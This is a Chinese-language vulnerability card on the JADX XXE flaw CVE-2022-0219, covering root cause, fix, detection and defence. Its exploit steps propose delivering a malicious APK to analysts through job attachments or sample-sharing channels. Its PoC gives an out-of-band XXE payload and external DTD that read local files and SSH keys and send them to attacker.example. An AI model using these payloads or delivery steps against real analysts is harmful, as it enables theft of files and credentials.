---
id: tools-jadx-xxe-xmlsecurity-not-used-manifest-parser
title: JADX XXE（CVE-2022-0219）：XmlSecurity 已实现但 parseXml 未调用，恶意 APK 内 XML 触发外部实体读取与外带文件
type: scenario
domain: tools
path: tools
technique: xxe-documentbuilderfactory-missing-secure-config
aliases:
- CVE-2022-0219
- JADX XXE
- AndroidManifestParser XXE
- XmlSecurity 未调用
- jadx 1.3.2 之前 XXE
- 恶意 APK 攻击分析者
tags:
- jadx
- xxe
- android
- reverse-engineering
- tool-vulnerability
- documentbuilderfactory
- cve-2022-0219
cve:
- CVE-2022-0219
affected_versions: < 1.3.2
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V576
  verified_at: '2026-11-12T11:09:22+08:00'
  notes: 已通读原文并逐张核对31图：图01 NVD 搜索结果明确写 'Improper Restriction of XML External Entity Reference in GitHub repository skylot/jadx prior to 1.3.2'，故 affected_versions '< 1.3.2' 有原文依据（已 set-versions）；图02 显示 parseXml 直接 DocumentBuilderFactory.newInstance().newDocumentBuilder()，同屏 find-in-files 可见 XmlSecurity.java 已存在但未被调用；图03 显示 parseAppStrings/parseAndroidManifest 均调用 parseXml，与卡一致；修复提交 c6a78c0d 与 XmlSecurity 七项配置与原文代码块逐项一致。原文为工具代码审计+修复对比，未给出实际 XXE 利用 PoC，卡已如实标注并用标准 OOB 载荷示意，危害依据 NVD/huntr 记录，未本机复现。资源路径穿越（图04-31）最终被 isInSubDirectory 拦截，只能覆盖 resources 目录内文件，作者自评鸡肋，卡作为变体记录、不单独成卡，成立。dedup 全为 new（Struts2 S2-069 等均为 Web 服务端 XXE，非同链），库内无其他 JADX 卡。原子；frontmatter 无 sources/source_url。
---

## 一句话结论

JADX 1.3.2 之前的 `AndroidManifestParser#parseXml`/`parseAndroidManifest` 直接使用 `DocumentBuilderFactory.newInstance().newDocumentBuilder()` 解析 XML，虽然项目里已有 `XmlSecurity.getSecureDbf()` 却没有调用，DOCTYPE 与外部实体仍被解析；攻击者把带外部实体的 XML 放进恶意 APK，安全分析人员用 JADX 打开时就会在分析机上触发 XXE，实现本地文件读取或经外部 DTD 外带。

## 原理

- **解析器默认不安全**：Java 的 `DocumentBuilderFactory` 默认允许 DOCTYPE 与外部通用/参数实体；未显式关闭时，XML 中的 `<!ENTITY xxe SYSTEM "file:///...">` 会被解析器读取并替换进文档，XML 中的外部 DTD 还会发起 HTTP 请求，构成 XXE（文件读取/SSRF/外带）。
- **已有安全实现但未接入**：修复前代码中 `com.jadx.core.utils.android.XmlSecurity` 已经实现了安全工厂（`disallow-doctype-decl=true`、关闭 `load-external-dtd`、`external-general-entities`、`external-parameter-entities`、`create-entity-ref-nodes`、`XIncludeAware=false`、`expandEntityReferences=false`），但 `parseXml` 实际走的是 `DocumentBuilderFactory.newInstance()` 的默认路径，安全类形同虚设。
- **攻击面来自"分析不可信样本"**：JADX 的用途就是打开不信任的 APK；`AndroidManifestParser` 会解析清单/XML 内容（`parseAppStrings`、`parseAndroidManifest` 都调用 `parseXml(content)`）。恶意样本中的 XML 在分析者机器上被解析，损害发生在安全人员一侧，而不是 Android 设备。
- **修复**：提交 `c6a78c0d...` 将 XML 解析统一改为调用 `XmlSecurity.getSecureDbf()`，并确保所有需要解析 XML 的位置都走安全方法；NVD 记录受影响版本为 skylot/jadx prior to 1.3.2（CVE-2022-0219）。
- **影响**：可读取分析机上的本地文件（如用户目录、配置文件、密钥）并通过外部 DTD 回传到攻击者服务器；也可探测/访问分析者内网（SSRF），为后续攻击提供情报。

## 触发条件

- 使用 JADX < 1.3.2（未修复版本）打开攻击者构造的 APK/XML 样本。
- 样本中的 XML 被 `AndroidManifestParser#parseXml` 等未加固解析路径处理，且包含 DOCTYPE/外部实体。
- 分析机可访问攻击者控制的 HTTP 服务（用于 OOB 外带），或本地文件可被实体读取。
- 分析环境未做网络隔离/沙箱（否则外带受限，但本地文件读取仍可能成立）。

## 利用步骤

1. 确认目标分析者使用的 JADX 版本低于 1.3.2（版本信息、界面/构建号）。
2. 构造恶意 APK：在 JADX 会解析的 XML 位置（如清单相关/资源 XML）加入带外部实体的 DOCTYPE，实体指向本地敏感文件或外部 DTD。
3. 通过样本投递渠道（招聘附件、交流群、样本共享平台）让分析者用 JADX 打开。
4. JADX 解析 XML 时解析器读取本地文件，并通过外部 DTD 把内容拼进 HTTP 请求发往攻击者服务器；或直接在解析结果/异常中观察到文件内容。
5. 收集外带数据（本地文件、内网探测结果），用于进一步攻击分析者主机或内网。

## PoC

原文未给出具体 PoC；可用标准 XXE OOB 载荷验证（放入被 JADX 解析的 XML 中）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
  <!ENTITY % file SYSTEM "file:///C:/Windows/win.ini">
  <!ENTITY % dtd SYSTEM "http://attacker.example/evil.dtd">
  %dtd;
]>
<r>&send;</r>
```

```xml
<!-- attacker.example/evil.dtd -->
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.example/?x=%file;'>">
%all;
```

- 也可用 `file:///etc/passwd`、`file:///C:/Users/<user>/.ssh/id_rsa` 等路径；带换行/特殊字符的文件需分块外带。
- 验证时先确认目标 JADX 版本与 XML 解析是否走到 `parseXml`，不同版本的解析入口不同。

## 变体与关联

- **同类工具漏洞**：任何解析不可信样本的桌面工具（apktool、IDA 加载器、反编译/解包工具）都可能因默认 XML 解析器触发 XXE；审计要点是搜索 `DocumentBuilderFactory.newInstance()`、`SAXParserFactory`、`XMLInputFactory` 等是否关闭 DTD/外部实体。
- **CVE-2022-39259（同产品）**：JADX ≤1.4.5 打开包含 HTML 序列的 zip 可导致 DoS，属崩溃/拒绝服务类，未单独成卡。
- **JADX 资源路径穿越（同文研究）**：把 resources.arsc 中 raw 类型改为 style 可让资源名带 `../`，但导出时 `isInSubDirectory` 检查阻止逃出 resources 目录，作者未能实现任意文件覆盖（仅能在 resources 目录内覆盖），属受限原语/半链，未单独成卡。
- **防御性对照**：项目内已有安全工具类但调用方遗漏是常见模式；审计时应验证"安全函数是否真正被所有解析路径使用"，而不是只看安全类是否存在。

## 检测与防御

- **升级**：使用 JADX >= 1.3.2（包含 CVE-2022-0219 修复）；定期检查所用逆向工具版本。
- **隔离分析环境**：在专用虚拟机/容器中打开不可信 APK，禁止或限制出站网络（阻断 OOB 外带），样本目录与敏感文件隔离。
- **行为监控**：监控 JADX/Java 进程对用户目录、SSH 密钥、配置文件等敏感路径的读取，以及异常外部 HTTP 请求；发现可疑样本立即隔离并排查主机。
- **开发侧**：所有 XML 解析统一调用安全工厂并显式设置 `disallow-doctype-decl`、关闭外部实体/DTD；为解析不可信输入建立代码审计规则与单元测试。
